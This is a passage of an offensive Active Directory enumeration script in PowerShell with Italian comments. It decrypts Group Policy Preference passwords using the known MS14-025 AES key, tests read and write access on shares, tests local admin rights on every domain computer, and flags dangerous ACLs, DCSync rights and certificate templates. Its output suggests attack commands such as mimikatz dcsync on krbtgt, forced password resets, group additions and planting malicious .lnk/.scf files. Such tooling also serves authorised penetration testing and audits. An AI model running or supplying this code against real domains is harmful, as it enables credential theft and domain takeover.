                "Disabled" { "DarkGray" }
                "Enforced" { "Red" }
                default { "White" }
            }

            Write-Both "        [$($link.TargetType)] $($link.Target) [$($link.Status)]" -Color $statusColor
        }

        # Security Filtering - chi può applicare questa GPO
        $gpoGuid = ($gpoNames.GetEnumerator() | Where-Object { $_.Value -eq $gpoName } | Select-Object -First 1).Key
        if ($gpoGuid) {
            try {
                $gpoDN = "CN=$gpoGuid,CN=Policies,CN=System,$DN"
                $gpoEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$gpoDN")
                $acl = $gpoEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])

                $applyFilters = @{}
                foreach ($ace in $acl) {
                    if ($ace.AccessControlType -ne "Allow") { continue }
                    $principal = $ace.IdentityReference.Value

                    # Salta account di sistema e admin
                    if ($principal -match "SYSTEM|Domain Admins|Enterprise Admins|Domain Controllers|CREATOR OWNER") { continue }

                    # Cerca permessi che indicano "Apply Group Policy"
                    if ($ace.ActiveDirectoryRights -match "ExtendedRight|GenericRead|ReadProperty") {
                        $applyFilters[$principal] = $true
                    }
                }

                foreach ($filter in $applyFilters.Keys) {
                    Write-Both "        [Security Filter] $filter" -Color DarkGray
                }
            } catch {}
        }
    }
    
    # GPO non linkate
    Write-Section "GPO NON LINKATE"
    $linkedGPOs = $gpoLinkMap.Keys
    $unlinkedCount = 0
    
    foreach ($gpoGuid in $gpoNames.Keys) {
        $gpoName = $gpoNames[$gpoGuid]
        if ($gpoName -notin $linkedGPOs) {
            Write-Both "    [*] $gpoName" -Color DarkGray
            $unlinkedCount++
        }
    }
    
    if ($unlinkedCount -eq 0) {
        Write-Info "Tutte le GPO sono linkate"
    }
    
    # Riepilogo per OU/Target
    Write-Section "RIEPILOGO PER TARGET"
    
    $byTarget = @{}
    foreach ($gpoName in $gpoLinkMap.Keys) {
        foreach ($link in $gpoLinkMap[$gpoName]) {
            $targetKey = "$($link.TargetType): $($link.Target)"
            if (-not $byTarget.ContainsKey($targetKey)) {
                $byTarget[$targetKey] = @()
            }
            $byTarget[$targetKey] += [PSCustomObject]@{
                GPO = $gpoName
                Status = $link.Status
            }
        }
    }
    
    foreach ($target in ($byTarget.Keys | Sort-Object)) {
        Write-SubSection $target
        foreach ($gpo in $byTarget[$target]) {
            $statusColor = if ($gpo.Status -eq "Enforced") { "Red" } elseif ($gpo.Status -eq "Disabled") { "DarkGray" } else { "White" }
            Write-Both "        -> $($gpo.GPO) [$($gpo.Status)]" -Color $statusColor
        }
    }
}

# Funzione per decrittare GPP password (migliorata con validazione input)
function Decrypt-GPPPassword {
    param([string]$Cpassword)
    
    # Validazione input migliorata
    if ([string]::IsNullOrWhiteSpace($Cpassword)) {
        return "[Empty cpassword]"
    }
    
    $Cpassword = $Cpassword.Trim()
    
    if ($Cpassword.Length -lt 4) {
        return "[Invalid cpassword - too short]"
    }
    
    # Chiave AES nota (MS14-025)
    $AesKey = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
                        0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                        0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
                        0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
    
    try {
        $mod = $Cpassword.Length % 4
        if ($mod -ne 0) {
            $Cpassword += '=' * (4 - $mod)
        }
        
        $decoded = [Convert]::FromBase64String($Cpassword)
        
        if ($decoded.Length -eq 0) {
            return "[Invalid cpassword - empty after decode]"
        }
        
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.Key = $AesKey
        $aes.IV = New-Object byte[] 16
        
        $decryptor = $aes.CreateDecryptor()
        $decrypted = $decryptor.TransformFinalBlock($decoded, 0, $decoded.Length)
        $aes.Dispose()
        
        return [System.Text.Encoding]::Unicode.GetString($decrypted)
    }
    catch [System.FormatException] {
        return "[Invalid Base64 format]"
    }
    catch [System.Security.Cryptography.CryptographicException] {
        return "[Decryption failed - invalid data]"
    }
    catch {
        return "[Decryption error: $($_.Exception.Message)]"
    }
}

function Get-DomainShares {
    Write-Banner "SHARE DI RETE"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    Write-Section "Ricerca Share e verifica accesso"
    Write-Info "Utente corrente: $env:USERDOMAIN\$env:USERNAME"
    Write-Both ""
    
    # Funzione per enumerare share via WMI (più completa di net view)
    function Get-RemoteShares {
        param([string]$ComputerName)
        
        $shares = @()
        
        # Metodo 1: WMI (trova tutte le share incluse quelle con spazi)
        try {
            $wmiShares = Get-WmiObject -Class Win32_Share -ComputerName $ComputerName -ErrorAction Stop
            foreach ($share in $wmiShares) {
                $shares += [PSCustomObject]@{
                    Name = $share.Name
                    Path = $share.Path
                    Description = $share.Description
                    Type = $share.Type
                }
            }
            return $shares
        }
        catch {}
        
        # Metodo 2: Fallback a net view (parsing migliorato)
        try {
            $netView = net view "\\$ComputerName" 2>&1
            if ($netView -notmatch "error|non accessible|not find") {
                $inShareSection = $false
                foreach ($line in $netView) {
                    # Salta header
                    if ($line -match "^Share name") { $inShareSection = $true; continue }
                    if ($line -match "^-{5,}") { continue }
                    if ($line -match "^The command completed") { break }
                    
                    if ($inShareSection -and $line.Trim()) {
                        # Parse più robusto per nomi con spazi
                        if ($line -match "^(.+?)\s+(Disk|Print)\s*(.*)$") {
                            $shares += [PSCustomObject]@{
                                Name = $matches[1].Trim()
                                Path = ""
                                Description = $matches[3].Trim()
                                Type = if ($matches[2] -eq "Disk") { 0 } else { 1 }
                            }
                        }
                    }
                }
            }
        }
        catch {}
        
        return $shares
    }
    
    # Funzione per testare accesso a share
    function Test-ShareAccess {
        param(
            [string]$ComputerName,
            [string]$ShareName
        )
        
        $sharePath = "\\$ComputerName\$ShareName"
        
        try {
            # Prova a listare il contenuto
            $null = [System.IO.Directory]::GetDirectories($sharePath)
            return "READ"
        }
        catch [System.UnauthorizedAccessException] {
            return "DENIED"
        }
        catch {
            # Prova con Test-Path come fallback
            try {
                if (Test-Path $sharePath -ErrorAction Stop) {
                    return "READ"
                }
            }
            catch {}
            return "DENIED"
        }
    }
    
    # Funzione per testare accesso in scrittura
    function Test-WriteAccess {
        param([string]$SharePath)
        
        try {
            $testFile = Join-Path $SharePath ".test_write_$([guid]::NewGuid().ToString().Substring(0,8))"
            [System.IO.File]::Create($testFile).Close()
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
            return $true
        }
        catch {
            return $false
        }
    }
    
    $allShares = @()
    $accessibleShares = @()
    $writableShares = @()
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
        
        # Test connettività
        $tcpTest = $null
        try {
            $tcpTest = Test-NetConnection -ComputerName $hostname -Port 445 -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
        }
        catch {
            # Fallback senza Test-NetConnection
            try {
                $socket = New-Object System.Net.Sockets.TcpClient
                $socket.Connect($hostname, 445)
                $tcpTest = @{ TcpTestSucceeded = $socket.Connected }
                $socket.Close()
            }
            catch {
                $tcpTest = @{ TcpTestSucceeded = $false }
            }
        }
        
        if (-not $tcpTest.TcpTestSucceeded) {
            Write-Both "    [*] $name - Non raggiungibile (porta 445)" -Color DarkGray
            continue
        }
        
        $shares = Get-RemoteShares -ComputerName $hostname
        
        if ($shares.Count -eq 0) {
            Write-Both "    [*] $name - Nessuna share trovata o accesso negato" -Color DarkGray
            continue
        }
        
        Write-SubSection "$name ($hostname)"
        
        foreach ($share in $shares) {
            $shareName = $share.Name
            $shareDesc = $share.Description
            $shareType = $share.Type
            
            # Determina tipo share
            $isHidden = $shareName.EndsWith('$')
            $isAdmin = $shareName -match '^(ADMIN\$|C\$|IPC\$)$'
            
            # Salta IPC$ (non accessibile come file share)
            if ($shareName -eq 'IPC$') { continue }
            
            # Test accesso
            $access = Test-ShareAccess -ComputerName $hostname -ShareName $shareName
            
            # Test scrittura se abbiamo accesso in lettura e non è share admin
            $writeAccess = $false
            if ($access -eq "READ" -and -not $isAdmin) {
                $writeAccess = Test-WriteAccess -SharePath "\\$hostname\$shareName"
            }
            
            # Salva per riepilogo
            $shareInfo = [PSCustomObject]@{
                Computer = $name
                Hostname = $hostname
                Share = $shareName
                Description = $shareDesc
                Hidden = $isHidden
                Access = $access
                Write = $writeAccess
            }
            $allShares += $shareInfo
            
            if ($access -eq "READ") {
                $accessibleShares += $shareInfo
                if ($writeAccess) {
                    $writableShares += $shareInfo
                }
            }
            
            # Output
            $accessColor = switch ($access) {
                "READ" { if ($writeAccess) { "Green" } else { "Yellow" } }
                "DENIED" { "Red" }
                default { "Gray" }
            }
            
            $accessText = switch ($access) {
                "READ" { if ($writeAccess) { "READ/WRITE" } else { "READ" } }
                "DENIED" { "DENIED" }
                default { "UNKNOWN" }
            }
            
            $shareDisplay = $shareName
            if ($shareDesc) { $shareDisplay += " ($shareDesc)" }
            if ($isHidden) { $shareDisplay += " [HIDDEN]" }
            
            Write-Both "        $shareDisplay -> [$accessText]" -Color $accessColor
        }
    }
    
    # Riepilogo
    if ($accessibleShares.Count -gt 0) {
        Write-Section "SHARE ACCESSIBILI ($($accessibleShares.Count) trovate)"
        
        foreach ($share in $accessibleShares) {
            $accessType = if ($share.Write) { "READ/WRITE" } else { "READ" }
            $color = if ($share.Write) { "Green" } else { "Yellow" }
            
            Write-Both "    \\$($share.Hostname)\$($share.Share) -> [$accessType]" -Color $color

            if ($share.Description) {
                Write-Both "        Descrizione: $($share.Description)" -Color DarkGray
            }
        }
    }
    
    if ($writableShares.Count -gt 0) {
        Write-Section "SHARE CON ACCESSO IN SCRITTURA! ($($writableShares.Count) trovate)"
        
        foreach ($share in $writableShares) {
            Write-Warning "\\$($share.Hostname)\$($share.Share)"
        }
        
        Write-Both ""
        Write-Info "Possibili attacchi su share scrivibili:"
        Write-Both "        - Pianta file malevoli (.lnk, .scf, .url)" -Color White
        Write-Both "        - Sovrascrivi script eseguiti da altri utenti" -Color White
        Write-Both "        - Cerca file sensibili (password, config, backup)" -Color White
    }
    
    # Share interessanti da investigare
    $interestingShares = $accessibleShares | Where-Object { 
        $_.Share -match 'backup|admin|config|password|secret|private|finance|hr|it|dev|important|confidential|restricted' -or
        $_.Description -match 'backup|password|config|important|confidential'
    }
    
    if ($interestingShares.Count -gt 0) {
        Write-Section "SHARE POTENZIALMENTE INTERESSANTI"
        
        foreach ($share in $interestingShares) {
            Write-Warning "\\$($share.Hostname)\$($share.Share)"
            if ($share.Description) {
                Write-Both "        Descrizione: $($share.Description)" -Color Yellow
            }
        }
    }
}

function Get-ACLAbuse {
    Write-Banner "POTENZIALI ACL ABUSE"
    
    Write-Section "Ricerca permessi pericolosi su oggetti AD"
    Write-Info "Oggetti: Utenti, Gruppi, Computer, GPO, OU, Domain, AdminSDHolder, CertTemplates"
    Write-Info "Permessi: GenericAll, GenericWrite, WriteOwner, WriteDACL, Self, AllExtendedRight"
    Write-Both ""
    
    # Permessi pericolosi da cercare
    $dangerousRights = @(
        'GenericAll',
        'GenericWrite', 
        'WriteOwner',
        'WriteDacl',
        'Self',
        'ForceChangePassword',
        'AllExtendedRights',
        "ExtendedRight"
    )

    $script:dangerousGUIDs = @(
        '00000000-0000-0000-0000-000000000000',  # All Extended Rights
        '00299570-246d-11d0-a768-00aa006e0529',  # User-Force-Change-Password
        '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes
        '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes-All
        'ab721a54-1e2f-11d0-9819-00aa0040529b',  # Send-As
        'ab721a56-1e2f-11d0-9819-00aa0040529b',  # Receive-As
        'bf9679c0-0de6-11d0-a285-00aa003049e2',  # Self-Membership (add yourself to groups)
        '0e10c968-78fb-11d2-90d4-00c04f79dc55',  # Certificate-Enrollment (ESC attacks)
        'a05b8cc2-17bc-4802-a710-e7c15ab866a2',  # Certificate-AutoEnrollment
        'ee914b82-0a98-11d1-adbb-00c04fd8d5cd',  # Manage-CA (ESC7)
        'f0f8ffab-1191-11d0-a060-00aa006c33ed',  # Validated-SPN
        '89e95b76-444d-4c62-991a-0facbeda640c'   # DS-Replication-Get-Changes-In-Filtered-Set
    )

    $script:guidToName = @{
        '00000000-0000-0000-0000-000000000000' = 'AllExtendedRights'
        '00299570-246d-11d0-a768-00aa006e0529' = 'User-Force-Change-Password'
        '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes'
        '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes-All'
        'ab721a54-1e2f-11d0-9819-00aa0040529b' = 'Send-As'
        'ab721a56-1e2f-11d0-9819-00aa0040529b' = 'Receive-As'
        'bf9679c0-0de6-11d0-a285-00aa003049e2' = 'Self-Membership'
        '0e10c968-78fb-11d2-90d4-00c04f79dc55' = 'Certificate-Enrollment'
        'a05b8cc2-17bc-4802-a710-e7c15ab866a2' = 'Certificate-AutoEnrollment'
        'ee914b82-0a98-11d1-adbb-00c04fd8d5cd' = 'Manage-CA'
        'f0f8ffab-1191-11d0-a060-00aa006c33ed' = 'Validated-SPN'
        '89e95b76-444d-4c62-991a-0facbeda640c' = 'DS-Replication-Get-Changes-In-Filtered-Set'
    }
    
    # SID da ignorare (built-in/system accounts)
    $ignoredSIDs = @(
        'S-1-5-18',           # Local System
        'S-1-5-32-544',       # BUILTIN\Administrators
        'S-1-5-32-548',       # BUILTIN\Account Operators
        'S-1-5-32-549',       # BUILTIN\Server Operators
        'S-1-5-32-550',       # BUILTIN\Print Operators
        'S-1-5-9',            # Enterprise Domain Controllers
        'S-1-3-0',            # Creator Owner
        'S-1-5-10'            # Self
    )
    
    $findings = @()
    
    # Ottieni Domain SID per filtrare gruppi privilegiati
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = $domainObj.PdcRoleOwner.Name
    $DN = ([adsi]'').distinguishedName
    $domainSID = (New-Object System.Security.Principal.NTAccount($domainObj.Name, "Domain Admins")).Translate([System.Security.Principal.SecurityIdentifier]).Value
    $domainSID = $domainSID -replace '-512$', ''  # Rimuovi RID per ottenere Domain SID
    
    # SID di gruppi privilegiati da ignorare
    $privilegedGroupSIDs = @(
        "$domainSID-512",     # Domain Admins
        "$domainSID-519",     # Enterprise Admins
        "$domainSID-518",     # Schema Admins
        "$domainSID-500",     # Administrator
        "$domainSID-516",     # Domain Controllers
        "$domainSID-498",     # Enterprise Read-Only Domain Controllers
        "$domainSID-521"      # Read-Only Domain Controllers
    )
    
    $allIgnored = $ignoredSIDs + $privilegedGroupSIDs
    
    # Funzione helper per convertire SID in nome
    function Convert-SIDToName {
        param([string]$SID)
        try {
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($SID)
            $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
            return $objUser.Value
        }
        catch {
            return $SID
        }
    }
    
    # Funzione helper per analizzare ACL
    function Get-DangerousACL {
        param(
            [string]$ObjectDN,
            [string]$ObjectName,
            [string]$ObjectType
        )
        
        $localFindings = @()
        
        try {
            $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$ObjectDN")
            $acl = $entry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
            
            foreach ($ace in $acl) {
                $rights = $ace.ActiveDirectoryRights.ToString()
                $sid = $ace.IdentityReference.Value
                $aceObjectType = $ace.ObjectType.ToString().ToLower()
                
                # Salta SID di sistema e gruppi privilegiati
                if ($sid -in $allIgnored) { continue }
                if ($sid -match '^S-1-5-21-.*-(512|519|518|500|516|498|521)$') { continue }
                
                # Controlla se ha permessi pericolosi
                foreach ($dangerous in $dangerousRights) {
                    if ($rights -match $dangerous) {
                        $aceGuid = $ace.ObjectType.ToString()

                        if ($dangerous -eq 'ExtendedRight' -and $aceObjectType -notin  $script:dangerousGUIDs) {    
                            continue
                        }
                        $principalName = Convert-SIDToName -SID $sid
                        
                        # Ignora se il principal è un gruppo privilegiato
                        if ($principalName -match 'Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Administrator|Domain Controllers|CREATOR OWNER') { continue }
                        
                        $localFindings += [PSCustomObject]@{
                            TargetObject = $ObjectName
                            TargetType = $ObjectType
                            Principal = $principalName
                            Rights = $rights
                            Dangerous = if ($dangerous -eq 'ExtendedRight') { 
                                $guidName = $script:guidToName[$aceObjectType]
                                if ($guidName) { $guidName } else { "ExtendedRight ($aceObjectType)" }
                            } else { 
                                $dangerous 
                            }
                        }
                        break
                    }
                }
            }
        }
        catch {}
        
        return $localFindings
    }
    
    # Enumera utenti
    Write-SubSection "Analisi ACL su Utenti..."
    $users = LDAPSearch -LDAPQuery "(samAccountType=805306368)"
    $userCount = 0
    
    foreach ($user in $users) {
        $userDN = $user.Properties.distinguishedname[0]
        $userName = $user.Properties.samaccountname[0]
        
        $findings += Get-DangerousACL -ObjectDN $userDN -ObjectName $userName -ObjectType "User"
        $userCount++
    }
    Write-Both "        Analizzati $userCount utenti" -Color DarkGray
    
    # Enumera gruppi
    Write-SubSection "Analisi ACL su Gruppi..."
    $groups = LDAPSearch -LDAPQuery "(objectCategory=group)"
    $groupCount = 0
    
    foreach ($group in $groups) {
        $groupDN = $group.Properties.distinguishedname[0]
        $groupName = $group.Properties.cn[0]
        
        $findings += Get-DangerousACL -ObjectDN $groupDN -ObjectName $groupName -ObjectType "Group"
        $groupCount++
    }
    Write-Both "        Analizzati $groupCount gruppi" -Color DarkGray
    
    # Enumera computer
    Write-SubSection "Analisi ACL su Computer..."
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    $compCount = 0
    
    foreach ($computer in $computers) {
        $compDN = $computer.Properties.distinguishedname[0]
        $compName = $computer.Properties.name[0]
        
        $findings += Get-DangerousACL -ObjectDN $compDN -ObjectName $compName -ObjectType "Computer"
        $compCount++
    }
    Write-Both "        Analizzati $compCount computer" -Color DarkGray
    
    # Enumera GPO
    Write-SubSection "Analisi ACL su Group Policy Objects..."
    $gpos = LDAPSearch -LDAPQuery "(objectCategory=groupPolicyContainer)"
    $gpoCount = 0
    
    foreach ($gpo in $gpos) {
        $gpoDN = $gpo.Properties.distinguishedname[0]
        $gpoName = $gpo.Properties.displayname[0]
        if (-not $gpoName) { $gpoName = $gpo.Properties.cn[0] }
        
        $findings += Get-DangerousACL -ObjectDN $gpoDN -ObjectName $gpoName -ObjectType "GPO"
        $gpoCount++
    }
    Write-Both "        Analizzate $gpoCount GPO" -Color DarkGray
    
    # Enumera Organizational Units
    Write-SubSection "Analisi ACL su Organizational Units..."
    $ous = LDAPSearch -LDAPQuery "(objectCategory=organizationalUnit)"
    $ouCount = 0
    
    foreach ($ou in $ous) {
        $ouDN = $ou.Properties.distinguishedname[0]
        $ouName = $ou.Properties.name[0]
        if (-not $ouName) { $ouName = $ou.Properties.ou[0] }
        
        $findings += Get-DangerousACL -ObjectDN $ouDN -ObjectName $ouName -ObjectType "OU"
        $ouCount++
    }
    Write-Both "        Analizzate $ouCount OU" -Color DarkGray
    
    # Analisi Domain Object
    Write-SubSection "Analisi ACL su Domain Object..."
    $findings += Get-DangerousACL -ObjectDN $DN -ObjectName "DOMAIN ROOT" -ObjectType "Domain"
    Write-Both "        Analizzato Domain Object" -Color DarkGray
    
    # Controlla DCSync rights sul dominio
    Write-SubSection "Analisi DCSync Rights..."
    try {
        $domainEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")
        $acl = $domainEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
        
        # GUIDs per DCSync
        $replicationGUIDs = @(
            '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes
            '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes-All
            '89e95b76-444d-4c62-991a-0facbeda640c'   # DS-Replication-Get-Changes-In-Filtered-Set
        )
        
        foreach ($ace in $acl) {
            $sid = $ace.IdentityReference.Value
            
            if ($sid -in $allIgnored) { continue }
            if ($sid -match '^S-1-5-21-.*-(512|519|518|500|516|498|521)$') { continue }
            
            $objectType = $ace.ObjectType.ToString()
            
            if ($objectType -in $replicationGUIDs) {
                $principalName = Convert-SIDToName -SID $sid
                
                if ($principalName -match 'Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Administrator|Domain Controllers') { continue }
                
                $findings += [PSCustomObject]@{
                    TargetObject = "DOMAIN"
                    TargetType = "DCSync"
                    Principal = $principalName
                    Rights = "Replication Rights"
                    Dangerous = "DCSync"
                }
            }
        }
    }
    catch {}
    Write-Both "        Analizzati DCSync Rights" -Color DarkGray

    # Analisi AdminSDHolder
    Write-SubSection "Analisi ACL su AdminSDHolder..."
    $adminSDHolderDN = "CN=AdminSDHolder,CN=System,$DN"
    try {
        $findings += Get-DangerousACL -ObjectDN $adminSDHolderDN -ObjectName "AdminSDHolder" -ObjectType "AdminSDHolder"
        Write-Both "        Analizzato AdminSDHolder" -Color DarkGray
    }
    catch {
        Write-Both "        AdminSDHolder non accessibile" -Color DarkGray
    }
    
    # Analisi Certificate Templates (AD CS)
    Write-SubSection "Analisi ACL su Certificate Templates..."
    try {
        $configDN = "CN=Configuration,$DN"
        $certTemplatesDN = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configDN"
        
        # Query per certificate templates
        $configEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$configDN")
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($configEntry)
        $searcher.Filter = "(objectClass=pKICertificateTemplate)"
        $searcher.PageSize = 1000
        $certTemplates = $searcher.FindAll()
        
        $certCount = 0
        foreach ($template in $certTemplates) {
            $templateDN = $template.Properties.distinguishedname[0]
            $templateName = $template.Properties.cn[0]
            
            $findings += Get-DangerousACL -ObjectDN $templateDN -ObjectName $templateName -ObjectType "CertTemplate"
            $certCount++
        }
        
        if ($certCount -gt 0) {
            Write-Both "        Analizzati $certCount Certificate Templates" -Color DarkGray
        } else {
            Write-Both "        Nessun Certificate Template trovato" -Color DarkGray
        }
    }
    catch {
        Write-Both "        AD CS non installato o non accessibile" -Color DarkGray
    }
    
    # Mostra risultati
    if ($findings.Count -gt 0) {
        Write-Section "PERMESSI PERICOLOSI TROVATI! ($($findings.Count) findings)"
        
        # Raggruppa per principal
        $groupedFindings = $findings | Group-Object -Property Principal
        
        foreach ($group in $groupedFindings) {
            Write-Warning "$($group.Name) ha permessi pericolosi:"
            
            foreach ($finding in $group.Group) {
                # Colore basato sul tipo di oggetto
                $typeColor = switch ($finding.TargetType) {
                    'User' { 'White' }
                    'Group' { 'Cyan' }
                    'Computer' { 'Gray' }
                    'GPO' { 'Magenta' }
                    'OU' { 'Blue' }
                    'Domain' { 'Red' }
                    'DCSync' { 'Red' }
                    'AdminSDHolder' { 'Red' }
                    'CertTemplate' { 'Yellow' }
                    default { 'White' }
                }
                
                $dangerColor = if ($finding.Dangerous -match 'GenericAll|DCSync|WriteDacl') { 'Red' } else { 'Yellow' }
                
                Write-Both "        [$($finding.TargetType)] $($finding.TargetObject) -> $($finding.Dangerous)" -Color $dangerColor
            }
            Write-Both ""
        }
        
        Write-Section "POSSIBILI ATTACCHI"
        
        # GenericAll
        $genericAllFindings = $findings | Where-Object { $_.Dangerous -eq 'GenericAll' }
        if ($genericAllFindings) {
            $gaGroups = $genericAllFindings | Where-Object { $_.TargetType -eq 'Group' }
            $gaUsers = $genericAllFindings | Where-Object { $_.TargetType -eq 'User' }
            $gaComputers = $genericAllFindings | Where-Object { $_.TargetType -eq 'Computer' }
            $gaGPOs = $genericAllFindings | Where-Object { $_.TargetType -eq 'GPO' }
            
            Write-Info "GenericAll trovato - Puoi:"
            Write-Both "        - Cambiare password dell'oggetto target" -Color White
            Write-Both "        - Aggiungere utenti a gruppi" -Color White
            Write-Both "        - Modificare qualsiasi attributo" -Color White
            Write-Both ""

            if ($gaGroups) {
                Write-Both "        # Aggiungi utente a gruppo:" -Color Yellow
                foreach ($f in $gaGroups | Select-Object -First 3) {
                    Write-Both "        net group `"$($f.TargetObject)`" <tuouser> /add /domain" -Color Gray
                }
                Write-Both ""
            }

            if ($gaUsers) {
                Write-Both "        # Cambia password utente:" -Color Yellow
                foreach ($f in $gaUsers | Select-Object -First 3) {
                    Write-Both "        net user $($f.TargetObject) NuovaPassword123! /domain" -Color Gray
                }
                Write-Both ""
            }

            if ($gaComputers) {
                Write-Both "        # RBCD Attack su computer:" -Color Yellow
                Write-Both "        # Configura Resource-Based Constrained Delegation" -Color Gray
                Write-Both ""
            }

            if ($gaGPOs) {
                Write-Both "        # Modifica GPO per eseguire codice:" -Color Yellow
                Write-Both "        # Aggiungi Immediate Scheduled Task nella GPO" -Color Gray
                Write-Both ""
            }
        }
        
        # DCSync
        $dcSyncFindings = $findings | Where-Object { $_.Dangerous -eq 'DCSync' }
        if ($dcSyncFindings) {
            Write-Warning "DCSync Rights trovato - Puoi estrarre TUTTI gli hash!"
            Write-Both "        mimikatz # lsadump::dcsync /user:Administrator" -Color Yellow
            Write-Both "        mimikatz # lsadump::dcsync /user:krbtgt" -Color Yellow
            Write-Both "        impacket-secretsdump domain/user@DC" -Color Yellow
            Write-Both ""
        }

        # Write permissions
        $writeFindings = $findings | Where-Object { $_.Dangerous -match 'Write|Self' }
        if ($writeFindings) {
            Write-Info "Write permissions trovate - Puoi:"
            Write-Both "        - WriteDacl: Modificare i permessi dell'oggetto" -Color White
            Write-Both "        - WriteOwner: Diventare proprietario dell'oggetto" -Color White
            Write-Both "        - Self: Aggiungerti a gruppi (Self-Membership)" -Color White
            Write-Both ""
        }

        # AdminSDHolder
        $adminSDFindings = $findings | Where-Object { $_.TargetType -eq 'AdminSDHolder' }
        if ($adminSDFindings) {
            Write-Warning "Permessi su AdminSDHolder - Persistenza!"
            Write-Both "        # Modifica AdminSDHolder per ottenere permessi permanenti" -Color Yellow
            Write-Both "        # SDProp propagherà le modifiche ogni 60 minuti" -Color Yellow
            Write-Both ""
        }

        # Certificate Templates
        $certFindings = $findings | Where-Object { $_.TargetType -eq 'CertTemplate' }
        if ($certFindings) {
            Write-Warning "Permessi su Certificate Templates - ESC attacks!"
            Write-Both "        # Possibili attacchi ESC1-ESC8" -Color Yellow
            Write-Both "        Certify.exe find /vulnerable" -Color Yellow
            Write-Both ""
        }
        
    } else {
        Write-Info "Nessun permesso pericoloso trovato su utenti non privilegiati"
    }
}

#endregion

#region Funzioni Enumerazione Sessioni e Accessi

function Get-LocalAdminAccess {
    Write-Banner "RICERCA ACCESSO ADMIN LOCALE"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    $currentHost = $env:COMPUTERNAME
    $currentHost = $currentHost.ToLower()
    
    Write-Section "Test accesso Admin su tutti i computer"
    Write-Info "Utente corrente: $env:USERDOMAIN\$env:USERNAME"
    Write-Info "Host corrente: $currentHost (escluso dal test)"
    Write-Both ""
    
    $adminAccess = @()
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
    
        # Salta l'host corrente (case-insensitive)
        if ($name.ToLower() -eq $currentHost -or $hostname.StartsWith("$currentHost.")) {
            Write-Both "    [*] $name - Host corrente (skipped)" -Color DarkGray
            continue
        }
        
        # Test accesso C$ (più affidabile di ADMIN$)
        $cShare = "\\$hostname\C$"
        
        try {
            $testPath = Join-Path $cShare "Windows"
            $exists = Test-Path $testPath -ErrorAction Stop
            if ($exists) {
                $adminAccess += $hostname
                Write-Warning "$name ($hostname) - ADMIN ACCESS CONFERMATO!"
            }
            else {
                Write-Both "    [*] $name - Accesso negato" -Color DarkGray
            }
        }
        catch [System.UnauthorizedAccessException] {
            Write-Both "    [*] $name - Accesso negato" -Color DarkGray
        }
        catch {
            Write-Both "    [*] $name - Non raggiungibile" -Color DarkGray
        }
    }
    
    if ($adminAccess.Count -gt 0) {
        Write-Section "RIEPILOGO - Computer con Admin Access"
        foreach ($h in $adminAccess) {
            Write-Warning $h
        }
        Write-Both ""
        Write-Info "Puoi connetterti a questi computer ed estrarre credenziali!"
    } else {
        Write-Info "Nessun accesso admin locale trovato con l'utente corrente"
    }
    
    return 
}

function Get-LoggedOnUsersRemoteRegistry {
    param(
        [string]$ComputerName
    )
    
    $loggedOnUsers = @()
    
    try {
        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
        $subkeys = $reg.GetSubKeyNames()
        
        foreach ($sid in $subkeys) {
            # Filtra solo SID di utenti di dominio (S-1-5-21-...)
            if ($sid -match '^S-1-5-21-' -and $sid -notmatch '_Classes$') {
                try {
                    $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
                    $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
                    $loggedOnUsers += $objUser.Value
                }
                catch {
                    # Se non riesce a tradurre, salva il SID raw
                    $loggedOnUsers += "SID: $sid"
                }
            }
        }
        $reg.Close()
    }
    catch {
        return $null
    }
    
    return $loggedOnUsers
}

function Get-DomainLoggedOnUsers {
    Write-Banner "UTENTI LOGGATI NEL DOMINIO"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    Write-Section "Enumerazione sessioni via Remote Registry"
    Write-Info "Nota: Richiede Remote Registry attivo sul target (default su Server)"
    Write-Both ""
    
    $sessionsFound = @{}
    
    foreach ($computer in $computers) {
